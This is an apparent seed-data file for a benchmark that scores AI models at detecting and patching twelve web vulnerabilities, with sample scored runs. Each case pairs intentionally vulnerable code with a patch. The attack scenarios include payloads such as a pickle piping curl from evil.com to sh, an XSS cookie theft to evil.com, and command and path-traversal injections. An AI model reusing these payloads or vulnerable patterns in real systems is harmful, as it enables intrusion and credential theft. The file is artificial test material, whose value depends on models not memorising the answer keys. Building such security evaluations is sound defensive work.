import { TestCase, ModelSnapshot, EvaluationRun } from '@/types';

export const SEED_MODELS: ModelSnapshot[] = [
  {
    id: 'claude-3-5-sonnet',
    name: 'Claude 3.5 Sonnet',
    provider: 'Anthropic',
    version: '20241022',
    context_window_k: 200,
    api_model_id: 'claude-3-5-sonnet-20241022',
    description: 'Frontier reasoning and code analysis model with high nuance in security audits.',
    badge: 'Leader'
  },
  {
    id: 'gpt-4o',
    name: 'GPT-4o',
    provider: 'OpenAI',
    version: '2024-08-06',
    context_window_k: 128,
    api_model_id: 'gpt-4o-2024-08-06',
    description: 'Omni-model specialized for high-speed multi-lingual code analysis.',
    badge: 'Runner Up'
  },
  {
    id: 'gemini-1-5-pro',
    name: 'Gemini 1.5 Pro',
    provider: 'Google',
    version: '002',
    context_window_k: 2000,
    api_model_id: 'gemini-1.5-pro-002',
    description: 'Ultra-long context model capable of analyzing entire multi-file repositories.',
    badge: 'Long Context'
  },
  {
    id: 'deepseek-coder-v2',
    name: 'DeepSeek Coder V2',
    provider: 'DeepSeek',
    version: 'Instruct-236B',
    context_window_k: 128,
    api_model_id: 'deepseek-coder-v2-instruct',
    description: 'Open-weights specialized coding MoE model with strong AST reasoning.',
    badge: 'Open Weights'
  }
];

export const SEED_TEST_CASES: TestCase[] = [
  {
    id: 'tc-001',
    title: 'FastAPI Dynamic Filter SQL Injection',
    language: 'python',
    cwe_id: 'CWE-89',
    cwe_name: 'Improper Neutralization of Special Elements used in an SQL Command',
    category: 'Injection',
    severity: 'critical',
    difficulty: 'medium',
    vulnerable_code: `@app.get("/api/users/search")
async def search_users(query: str, status: str = "active", db: Session = Depends(get_db)):
    # Vulnerable raw query construction
    sql = f"SELECT id, username, email FROM users WHERE status = '{status}' AND username LIKE '%{query}%'"
    result = db.execute(text(sql))
    return [{"id": row[0], "username": row[1], "email": row[2]} for row in result]`,
    vulnerability_lines: [4, 5],
    description: 'Direct f-string interpolation into raw SQL query allows SQL injection via the query or status parameter.',
    attack_scenario: 'An attacker submits `query=\' OR \'1\'=\'1` or `query=\'; DROP TABLE users; --` extracting unauthorized data or altering table schema.',
    expected_patch: `@app.get("/api/users/search")
async def search_users(query: str, status: str = "active", db: Session = Depends(get_db)):
    # Parameterized SQL query with bound parameters
    sql = text("SELECT id, username, email FROM users WHERE status = :status AND username LIKE :query")
    result = db.execute(sql, {"status": status, "query": f"%{query}%"})
    return [{"id": row[0], "username": row[1], "email": row[2]} for row in result]`,
    patch_explanation: 'Use SQLAlchemy parameterized queries with bound `:param` parameters rather than string concatenation or f-strings.',
    tags: ['fastapi', 'sqlalchemy', 'sql-injection', 'owasp-a03'],
    created_at: '2026-09-01T10:00:00Z'
  },
  {
    id: 'tc-002',
    title: 'Node.js Express Webhook Server-Side Request Forgery (SSRF)',
    language: 'javascript',
    cwe_id: 'CWE-918',
    cwe_name: 'Server-Side Request Forgery (SSRF)',
    category: 'SSRF & Network',
    severity: 'critical',
    difficulty: 'hard',
    vulnerable_code: `app.post('/api/webhook/test', async (req, res) => {
  const { targetUrl } = req.body;
  if (!targetUrl || !targetUrl.startsWith('http')) {
    return res.status(400).json({ error: 'Invalid URL scheme' });
  }

  try {
    // Directly fetching user-supplied URL without IP range validation
    const response = await fetch(targetUrl, { method: 'POST', body: JSON.stringify({ ping: true }) });
    const data = await response.text();
    return res.json({ success: true, preview: data.slice(0, 100) });
  } catch (err) {
    return res.status(500).json({ error: err.message });
  }
});`,
    vulnerability_lines: [8],
    description: 'The endpoint checks only that the URL starts with http, failing to validate whether the host resolves to private/loopback IP ranges (127.0.0.1, 169.254.169.254, 10.0.0.0/8).',
    attack_scenario: 'Attacker supplies `http://169.254.169.254/latest/meta-data/` to dump cloud AWS/GCP IAM credentials from metadata services.',
    expected_patch: `import { isPrivateIP } from './network-validator';
import dns from 'dns/promises';

app.post('/api/webhook/test', async (req, res) => {
  const { targetUrl } = req.body;
  try {
    const parsed = new URL(targetUrl);
    if (!['http:', 'https:'].includes(parsed.protocol)) {
      return res.status(400).json({ error: 'Only HTTP/HTTPS allowed' });
    }
    
    // Resolve DNS and strictly block private/loopback IPs
    const lookup = await dns.lookup(parsed.hostname);
    if (isPrivateIP(lookup.address)) {
      return res.status(403).json({ error: 'Access to internal/private IP ranges is prohibited' });
    }

    const response = await fetch(targetUrl, { method: 'POST', body: JSON.stringify({ ping: true }) });
    return res.json({ success: true });
  } catch (err) {
    return res.status(500).json({ error: 'Webhook delivery failed' });
  }
});`,
    patch_explanation: 'Parse URL object and perform DNS lookup before fetching to reject RFC 1918 private subnets and cloud instance metadata addresses.',
    tags: ['express', 'ssrf', 'cloud-security', 'owasp-a10'],
    created_at: '2026-09-02T11:00:00Z'
  },
  {
    id: 'tc-003',
    title: 'Python Flask Insecure Pickle Deserialization in Session Cache',
    language: 'python',
    cwe_id: 'CWE-502',
    cwe_name: 'Deserialization of Untrusted Data',
    category: 'Deserialization',
    severity: 'critical',
    difficulty: 'easy',
    vulnerable_code: `import pickle
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/profile/load", methods=["POST"])
def load_cached_profile():
    encoded_token = request.headers.get("X-Profile-State")
    if not encoded_token:
        return jsonify({"error": "Missing token"}), 400

    # Unsafe deserialization of client-controlled byte stream
    raw_bytes = base64.b64decode(encoded_token)
    user_object = pickle.loads(raw_bytes)
    return jsonify({"username": user_object.get("username")})`,
    vulnerability_lines: [14],
    description: 'Python pickle module should never be used to deserialize client-controlled data because crafted payloads can execute arbitrary system commands via `__reduce__`.',
    attack_scenario: 'Attacker creates a custom pickle object with os.system("curl https://evil.com/shell | sh") resulting in complete Remote Code Execution (RCE).',
    expected_patch: `import json
import base64
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/profile/load", methods=["POST"])
def load_cached_profile():
    encoded_token = request.headers.get("X-Profile-State")
    if not encoded_token:
        return jsonify({"error": "Missing token"}), 400

    try:
        # Use safe JSON deserialization with strict schema
        raw_bytes = base64.b64decode(encoded_token)
        user_object = json.loads(raw_bytes.decode('utf-8'))
        return jsonify({"username": user_object.get("username")})
    except (json.JSONDecodeError, UnicodeDecodeError):
        return jsonify({"error": "Invalid token format"}), 400`,
    patch_explanation: 'Replace `pickle.loads` with standard `json.loads` or a cryptographically signed HMAC token (e.g. itsdangerous/JWT).',
    tags: ['flask', 'pickle', 'rce', 'owasp-a08'],
    created_at: '2026-09-03T14:30:00Z'
  },
  {
    id: 'tc-004',
    title: 'Node.js Express File Download Path Traversal',
    language: 'javascript',
    cwe_id: 'CWE-22',
    cwe_name: 'Improper Limitation of a Pathname to a Restricted Directory',
    category: 'Access Control',
    severity: 'high',
    difficulty: 'medium',
    vulnerable_code: `const path = require('path');
const fs = require('fs');

app.get('/api/reports/download', (req, res) => {
  const filename = req.query.file;
  const reportsDir = path.join(__dirname, 'public_reports');
  
  // Vulnerable path concatenation allowing ../ directory traversal
  const targetPath = path.join(reportsDir, filename);

  if (fs.existsSync(targetPath)) {
    return res.sendFile(targetPath);
  }
  return res.status(404).json({ error: 'File not found' });
});`,
    vulnerability_lines: [8],
    description: 'Directly joining user input with `path.join` does not prevent directory traversal if the user supplies `../../etc/passwd` or relative dot-dot segments.',
    attack_scenario: 'Attacker accesses `GET /api/reports/download?file=../../../../etc/shadow` or `.env` to leak environment variables.',
    expected_patch: `const path = require('path');
const fs = require('fs');

app.get('/api/reports/download', (req, res) => {
  const filename = req.query.file;
  if (!filename || typeof filename !== 'string') {
    return res.status(400).json({ error: 'Invalid file parameter' });
  }

  const reportsDir = path.resolve(__dirname, 'public_reports');
  // Sanitize basename and verify normalized path is strictly inside base directory
  const safeFilename = path.basename(filename);
  const targetPath = path.resolve(reportsDir, safeFilename);

  if (!targetPath.startsWith(reportsDir) || !fs.existsSync(targetPath)) {
    return res.status(404).json({ error: 'File not found' });
  }
  return res.sendFile(targetPath);
});`,
    patch_explanation: 'Use `path.basename()` to strip directory sequences and verify `targetPath.startsWith(reportsDir)`.',
    tags: ['express', 'path-traversal', 'lfi', 'owasp-a01'],
    created_at: '2026-09-04T09:15:00Z'
  },
  {
    id: 'tc-005',
    title: 'Go JWT Token Generation with Fallback Hardcoded Secret',
    language: 'go',
    cwe_id: 'CWE-798',
    cwe_name: 'Use of Hard-coded Credentials',
    category: 'Secrets & Auth',
    severity: 'critical',
    difficulty: 'easy',
    vulnerable_code: `package auth

import (
	"os"
	"time"
	"github.com/golang-jwt/jwt/v5"
)

func GenerateAuthToken(userID string, role string) (string, error) {
	secret := os.Getenv("JWT_SECRET_KEY")
	if secret == "" {
		// Vulnerable fallback hardcoded secret in production build
		secret = "super_secret_jwt_fallback_key_12345!"
	}

	claims := jwt.MapClaims{
		"sub":  userID,
		"role": role,
		"exp":  time.Now().Add(time.Hour * 24).Unix(),
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret))
}`,
    vulnerability_lines: [12],
    description: 'Falling back to a hardcoded string when an environment variable is unset creates an easily forgeable token vulnerability if deployed without explicit env vars.',
    attack_scenario: 'Attacker creates forged admin JWT tokens signed with `super_secret_jwt_fallback_key_12345!` gaining full root access.',
    expected_patch: `package auth

import (
	"errors"
	"os"
	"time"
	"github.com/golang-jwt/jwt/v5"
)

func GenerateAuthToken(userID string, role string) (string, error) {
	secret := os.Getenv("JWT_SECRET_KEY")
	if len(secret) < 32 {
		return "", errors.New("JWT_SECRET_KEY environment variable missing or insufficiently strong")
	}

	claims := jwt.MapClaims{
		"sub":  userID,
		"role": role,
		"exp":  time.Now().Add(time.Hour * 24).Unix(),
	}

	token := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
	return token.SignedString([]byte(secret))
}`,
    patch_explanation: 'Refuse to generate tokens and fail-fast with an explicit error if the secret environment variable is missing or short.',
    tags: ['golang', 'jwt', 'hardcoded-credentials', 'owasp-a07'],
    created_at: '2026-09-05T16:20:00Z'
  },
  {
    id: 'tc-006',
    title: 'FastAPI Insecure Direct Object Reference (IDOR) on Invoice Retrieval',
    language: 'python',
    cwe_id: 'CWE-862',
    cwe_name: 'Missing Authorization',
    category: 'Access Control',
    severity: 'high',
    difficulty: 'medium',
    vulnerable_code: `@app.get("/api/invoices/{invoice_id}")
async def get_invoice(invoice_id: int, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # Vulnerable: fetches invoice strictly by ID without asserting user ownership or role
    invoice = db.query(Invoice).filter(Invoice.id == invoice_id).first()
    if not invoice:
        raise HTTPException(status_code=404, detail="Invoice not found")
    
    return invoice`,
    vulnerability_lines: [4],
    description: 'The endpoint verifies the user is authenticated, but fails to check if `invoice.organization_id == current_user.organization_id` or if the user is an admin.',
    attack_scenario: 'Any authenticated user can iterate through `/api/invoices/1`, `/api/invoices/2` to view sensitive financial data of competitors.',
    expected_patch: `@app.get("/api/invoices/{invoice_id}")
async def get_invoice(invoice_id: int, current_user: User = Depends(get_current_user), db: Session = Depends(get_db)):
    # Scoped query enforcing tenant separation
    query = db.query(Invoice).filter(Invoice.id == invoice_id)
    if not current_user.is_superuser:
        query = query.filter(Invoice.tenant_id == current_user.tenant_id)

    invoice = query.first()
    if not invoice:
        raise HTTPException(status_code=404, detail="Invoice not found")
    
    return invoice`,
    patch_explanation: 'Ensure all resource lookup queries filter by the authenticated user’s tenant/organization identity.',
    tags: ['fastapi', 'idor', 'access-control', 'owasp-a01'],
    created_at: '2026-09-06T12:00:00Z'
  },
  {
    id: 'tc-007',
    title: 'Python Cryptography Insecure AES-ECB Mode Cipher',
    language: 'python',
    cwe_id: 'CWE-327',
    cwe_name: 'Use of a Broken or Risky Cryptographic Algorithm',
    category: 'Cryptography',
    severity: 'medium',
    difficulty: 'medium',
    vulnerable_code: `from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def encrypt_sensitive_record(data: bytes, key: bytes) -> bytes:
    # Insecure ECB mode preserves patterns in plaintext
    cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
    encryptor = cipher.encryptor()
    
    # Pad data to 16 bytes block size
    padded = data + b' ' * (16 - len(data) % 16)
    return encryptor.update(padded) + encryptor.finalize()`,
    vulnerability_lines: [6],
    description: 'AES in Electronic Codebook (ECB) mode encrypts identical plaintext blocks into identical ciphertext blocks, leaking structural patterns without providing integrity.',
    attack_scenario: 'An attacker can detect repeated data patterns (e.g. the famous ECB Penguin leak) or reorder encrypted blocks without detection.',
    expected_patch: `import os
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def encrypt_sensitive_record(data: bytes, key: bytes) -> tuple[bytes, bytes]:
    # Use authenticated encryption (AES-GCM) with unique 96-bit nonce
    aesgcm = AESGCM(key)
    nonce = os.urandom(12)
    ciphertext = aesgcm.encrypt(nonce, data, None)
    return nonce, ciphertext`,
    patch_explanation: 'Use Authenticated Encryption with Associated Data (AEAD) like AES-GCM or ChaCha20-Poly1305 with random nonces.',
    tags: ['cryptography', 'aes-ecb', 'encryption', 'owasp-a02'],
    created_at: '2026-09-07T14:00:00Z'
  },
  {
    id: 'tc-008',
    title: 'React Unsafe HTML Injection via dangerouslySetInnerHTML',
    language: 'javascript',
    cwe_id: 'CWE-79',
    cwe_name: 'Improper Neutralization of Input During Web Page Generation',
    category: 'Injection',
    severity: 'high',
    difficulty: 'easy',
    vulnerable_code: `import React from 'react';
import { useSearchParams } from 'next/navigation';

export default function ArticleNotification() {
  const searchParams = useSearchParams();
  const rawNotice = searchParams.get('notice') || 'Default Notice';

  return (
    <div className="p-4 bg-yellow-50 border border-yellow-200 rounded">
      <h3>System Notice</h3>
      {/* Vulnerable direct HTML injection from unvalidated URL parameter */}
      <div dangerouslySetInnerHTML={{ __html: rawNotice }} />
    </div>
  );
}`,
    vulnerability_lines: [11],
    description: 'Passing untrusted query parameter strings directly into `dangerouslySetInnerHTML` allows Cross-Site Scripting (XSS).',
    attack_scenario: 'Attacker sends link: `?notice=<img src=x onerror="fetch(\'https://evil.com/steal?\'+document.cookie)">` stealing session tokens.',
    expected_patch: `import React from 'react';
import { useSearchParams } from 'next/navigation';
import DOMPurify from 'isomorphic-dompurify';

export default function ArticleNotification() {
  const searchParams = useSearchParams();
  const rawNotice = searchParams.get('notice') || 'Default Notice';
  
  // Sanitize markup using DOMPurify before rendering
  const cleanNotice = DOMPurify.sanitize(rawNotice);

  return (
    <div className="p-4 bg-yellow-50 border border-yellow-200 rounded">
      <h3>System Notice</h3>
      <div dangerouslySetInnerHTML={{ __html: cleanNotice }} />
    </div>
  );
}`,
    patch_explanation: 'Use DOMPurify to strip malicious script tags and inline handlers, or render as plain text `{rawNotice}` when HTML is not required.',
    tags: ['react', 'xss', 'frontend-security', 'owasp-a03'],
    created_at: '2026-09-08T18:00:00Z'
  },
  {
    id: 'tc-009',
    title: 'Python Flask OS Command Injection in System Diagnostic Ping',
    language: 'python',
    cwe_id: 'CWE-78',
    cwe_name: 'Improper Neutralization of Special Elements used in an OS Command',
    category: 'Injection',
    severity: 'critical',
    difficulty: 'easy',
    vulnerable_code: `import os
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/network/ping", methods=["POST"])
def ping_host():
    host = request.json.get("host")
    # Vulnerable direct command string concatenation
    cmd = f"ping -c 1 {host}"
    output = os.popen(cmd).read()
    return jsonify({"output": output})`,
    vulnerability_lines: [10],
    description: 'Passing untrusted host inputs directly to a shell command via `os.popen()` or `os.system()` permits shell metacharacters (; | & `) to execute arbitrary OS commands.',
    attack_scenario: 'Attacker supplies `host="8.8.8.8; cat /etc/passwd"` resulting in full server takeover.',
    expected_patch: `import subprocess
import ipaddress
from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route("/api/network/ping", methods=["POST"])
def ping_host():
    host = request.json.get("host", "").strip()
    try:
        # Validate that host is strictly an IP address
        ipaddress.ip_address(host)
    except ValueError:
        return jsonify({"error": "Invalid IP address"}), 400

    # Run subprocess safely with list arguments (shell=False)
    result = subprocess.run(["ping", "-c", "1", host], capture_output=True, text=True, timeout=5)
    return jsonify({"output": result.stdout})`,
    patch_explanation: 'Validate strict IP syntax with `ipaddress` module and pass arguments as an array to `subprocess.run(..., shell=False)`.',
    tags: ['flask', 'command-injection', 'rce', 'owasp-a03'],
    created_at: '2026-09-09T10:00:00Z'
  },
  {
    id: 'tc-010',
    title: 'Node.js Dynamic Formula Evaluation Code Injection',
    language: 'javascript',
    cwe_id: 'CWE-94',
    cwe_name: 'Improper Control of Generation of Code (\'Code Injection\')',
    category: 'Injection',
    severity: 'critical',
    difficulty: 'medium',
    vulnerable_code: `const express = require('express');
const app = express();
app.use(express.json());

app.post('/api/calculate', (req, res) => {
  const { formula } = req.body;
  try {
    // Dangerous eval execution of client-supplied JavaScript string
    const result = eval(formula);
    return res.json({ result });
  } catch (err) {
    return res.status(400).json({ error: 'Evaluation failed' });
  }
});`,
    vulnerability_lines: [9],
    description: 'Using `eval()` on user-supplied strings executes raw JavaScript in the Node.js runtime context with access to `process` and `require`.',
    attack_scenario: 'Attacker sends `formula="process.mainModule.require(\'child_process\').execSync(\'id\').toString()"` achieving instant RCE.',
    expected_patch: `const express = require('express');
const math = require('mathjs');
const app = express();
app.use(express.json());

app.post('/api/calculate', (req, res) => {
  const { formula } = req.body;
  if (!formula || typeof formula !== 'string') {
    return res.status(400).json({ error: 'Valid formula string required' });
  }

  try {
    // Safe mathematical AST parser without JavaScript runtime access
    const result = math.evaluate(formula);
    return res.json({ result: Number(result) });
  } catch (err) {
    return res.status(400).json({ error: 'Invalid mathematical expression' });
  }
});`,
    patch_explanation: 'Replace `eval()` with an isolated AST math expression parser like `mathjs` or a sandboxed lexer.',
    tags: ['express', 'eval', 'code-injection', 'owasp-a03'],
    created_at: '2026-09-10T12:00:00Z'
  },
  {
    id: 'tc-011',
    title: 'Express Unrestricted File Upload Remote Code Execution',
    language: 'javascript',
    cwe_id: 'CWE-434',
    cwe_name: 'Unrestricted Upload of File with Dangerous Type',
    category: 'Access Control',
    severity: 'critical',
    difficulty: 'medium',
    vulnerable_code: `const express = require('express');
const fileUpload = require('express-fileupload');
const path = require('path');
const app = express();

app.use(fileUpload());

app.post('/api/avatar/upload', (req, res) => {
  if (!req.files || !req.files.avatar) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const avatar = req.files.avatar;
  // Vulnerable: trusts client filename without checking extension or content-type
  const uploadPath = path.join(__dirname, 'public/uploads', avatar.name);

  avatar.mv(uploadPath, (err) => {
    if (err) return res.status(500).json({ error: err.message });
    return res.json({ url: '/uploads/' + avatar.name });
  });
});`,
    vulnerability_lines: [14],
    description: 'Saving user-uploaded files with the original client-controlled filename and extension inside the public web root allows uploading `.php`, `.js`, or `.html` web shells.',
    attack_scenario: 'Attacker uploads `shell.php` or `exploit.html` with stored XSS/backdoors directly inside the web root.',
    expected_patch: `const express = require('express');
const fileUpload = require('express-fileupload');
const crypto = require('crypto');
const path = require('path');
const app = express();

const ALLOWED_EXTENSIONS = new Set(['.png', '.jpg', '.jpeg', '.webp']);
const ALLOWED_MIME_TYPES = new Set(['image/png', 'image/jpeg', 'image/webp']);

app.post('/api/avatar/upload', (req, res) => {
  if (!req.files || !req.files.avatar) {
    return res.status(400).json({ error: 'No file uploaded' });
  }

  const avatar = req.files.avatar;
  const ext = path.extname(avatar.name).toLowerCase();

  if (!ALLOWED_EXTENSIONS.has(ext) || !ALLOWED_MIME_TYPES.has(avatar.mimetype)) {
    return res.status(400).json({ error: 'Only JPG, PNG, and WebP images are allowed' });
  }

  // Generate unique randomized filename
  const safeFilename = crypto.randomUUID() + ext;
  const uploadPath = path.join(__dirname, 'public/uploads', safeFilename);

  avatar.mv(uploadPath, (err) => {
    if (err) return res.status(500).json({ error: 'Upload failed' });
    return res.json({ url: '/uploads/' + safeFilename });
  });
});`,
    patch_explanation: 'Enforce strict allowlists on extensions and MIME types, and always rename files to randomly generated UUIDs.',
    tags: ['express', 'file-upload', 'rce', 'owasp-a04'],
    created_at: '2026-09-11T14:00:00Z'
  },
  {
    id: 'tc-012',
    title: 'Python Django Predictable Password Reset Token Generator',
    language: 'python',
    cwe_id: 'CWE-287',
    cwe_name: 'Improper Authentication',
    category: 'Secrets & Auth',
    severity: 'high',
    difficulty: 'hard',
    vulnerable_code: `import random
import time
import hashlib

def generate_password_reset_token(user_id: int) -> str:
    # Insecure: relies on current timestamp and weak pseudo-random generator
    seed = f"{user_id}-{int(time.time())}-{random.randint(1000, 9999)}"
    return hashlib.md5(seed.encode()).hexdigest()`,
    vulnerability_lines: [7, 8],
    description: 'Using `random.randint` with low entropy and predictable epoch timestamps creates forgeable password reset tokens.',
    attack_scenario: 'Attacker requests password reset for target admin account, computes possible timestamp windows, and brute forces the token in seconds.',
    expected_patch: `import secrets

def generate_password_reset_token(user_id: int) -> str:
    # Cryptographically secure random token (256-bit entropy)
    return secrets.token_urlsafe(32)`,
    patch_explanation: 'Use Python `secrets` module (`secrets.token_urlsafe(32)`) to generate cryptographically unguessable authentication tokens.',
    tags: ['django', 'auth-bypass', 'weak-randomness', 'owasp-a07'],
    created_at: '2026-09-12T16:00:00Z'
  }
];

export const SEED_EVALUATION_RUNS: EvaluationRun[] = [
  // Claude 3.5 Sonnet on TC-001
  {
    id: 'eval-001',
    test_case_id: 'tc-001',
    model_id: 'claude-3-5-sonnet',
    prompt_used: 'Audit the provided code for security flaws...',
    raw_response: 'Vulnerability: SQL Injection (CWE-89) on lines 4-5. The status and query parameters are directly interpolated into the SQL string via f-strings...',
    detected_vulnerability: true,
    identified_cwe: 'CWE-89',
    correct_cwe: true,
    identified_lines: [4, 5],
    correct_lines: true,
    patch_provided: true,
    patch_secure: true,
    patch_code: 'sql = text("SELECT id, username, email FROM users WHERE status = :status AND username LIKE :query")\nresult = db.execute(sql, {"status": status, "query": f"%{query}%"})',
    score_detection: 40,
    score_cwe: 20,
    score_localization: 20,
    score_patch: 20,
    total_score: 100,
    latency_ms: 1240,
    timestamp: '2026-09-20T10:15:00Z'
  },
  // GPT-4o on TC-001
  {
    id: 'eval-002',
    test_case_id: 'tc-001',
    model_id: 'gpt-4o',
    prompt_used: 'Audit the provided code for security flaws...',
    raw_response: 'Identified SQL Injection (CWE-89) on line 4. Using format strings for queries introduces database injection...',
    detected_vulnerability: true,
    identified_cwe: 'CWE-89',
    correct_cwe: true,
    identified_lines: [4],
    correct_lines: true,
    patch_provided: true,
    patch_secure: true,
    patch_code: 'db.execute(text("SELECT id, username, email FROM users WHERE status = :status AND username LIKE :q"), {"status": status, "q": f"%{query}%"})',
    score_detection: 40,
    score_cwe: 20,
    score_localization: 18,
    score_patch: 20,
    total_score: 98,
    latency_ms: 980,
    timestamp: '2026-09-20T10:15:30Z'
  },
  // DeepSeek Coder on TC-002 (SSRF) - Failed deep IP check
  {
    id: 'eval-003',
    test_case_id: 'tc-002',
    model_id: 'deepseek-coder-v2',
    prompt_used: 'Audit the provided code for security flaws...',
    raw_response: 'The code checks if targetUrl starts with http. To improve, we should make sure targetUrl is a valid URL.',
    detected_vulnerability: false,
    identified_cwe: 'CWE-20',
    correct_cwe: false,
    identified_lines: [3],
    correct_lines: false,
    patch_provided: true,
    patch_secure: false,
    patch_code: 'const valid = targetUrl.startsWith("https://");',
    score_detection: 10,
    score_cwe: 0,
    score_localization: 5,
    score_patch: 0,
    total_score: 15,
    latency_ms: 1820,
    timestamp: '2026-09-20T10:16:00Z'
  },
  // Gemini 1.5 Pro on TC-002
  {
    id: 'eval-004',
    test_case_id: 'tc-002',
    model_id: 'gemini-1-5-pro',
    prompt_used: 'Audit the provided code for security flaws...',
    raw_response: 'Vulnerability: SSRF (CWE-918) on line 8. The endpoint fetches arbitrary internal or external addresses without validating whether the resolved IP belongs to private network CIDR blocks.',
    detected_vulnerability: true,
    identified_cwe: 'CWE-918',
    correct_cwe: true,
    identified_lines: [8],
    correct_lines: true,
    patch_provided: true,
    patch_secure: true,
    patch_code: 'Resolve DNS and check against RFC 1918 private IPs before calling fetch...',
    score_detection: 40,
    score_cwe: 20,
    score_localization: 20,
    score_patch: 18,
    total_score: 98,
    latency_ms: 1450,
    timestamp: '2026-09-20T10:16:30Z'
  },
  // Claude 3.5 Sonnet on TC-003 (Pickle Deserialization)
  {
    id: 'eval-005',
    test_case_id: 'tc-003',
    model_id: 'claude-3-5-sonnet',
    prompt_used: 'Audit the provided code for security flaws...',
    raw_response: 'Critical Vulnerability: Insecure Deserialization (CWE-502) on line 14. `pickle.loads()` is executed on base64 decoded client header data, allowing remote code execution.',
    detected_vulnerability: true,
    identified_cwe: 'CWE-502',
    correct_cwe: true,
    identified_lines: [14],
    correct_lines: true,
    patch_provided: true,
    patch_secure: true,
    patch_code: 'import json\nuser_object = json.loads(raw_bytes.decode("utf-8"))',
    score_detection: 40,
    score_cwe: 20,
    score_localization: 20,
    score_patch: 20,
    total_score: 100,
    latency_ms: 1100,
    timestamp: '2026-09-20T10:17:00Z'
  },
  // GPT-4o on TC-006 (IDOR)
  {
    id: 'eval-006',
    test_case_id: 'tc-006',
    model_id: 'gpt-4o',
    prompt_used: 'Audit the provided code for security flaws...',
    raw_response: 'Identified Missing Authorization / IDOR (CWE-862) on line 4. The user can view any invoice by passing an arbitrary invoice_id without tenancy validation.',
    detected_vulnerability: true,
    identified_cwe: 'CWE-862',
    correct_cwe: true,
    identified_lines: [4],
    correct_lines: true,
    patch_provided: true,
    patch_secure: true,
    patch_code: 'query = db.query(Invoice).filter(Invoice.id == invoice_id, Invoice.tenant_id == current_user.tenant_id)',
    score_detection: 40,
    score_cwe: 20,
    score_localization: 20,
    score_patch: 18,
    total_score: 98,
    latency_ms: 1020,
    timestamp: '2026-09-20T10:17:30Z'
  }
];
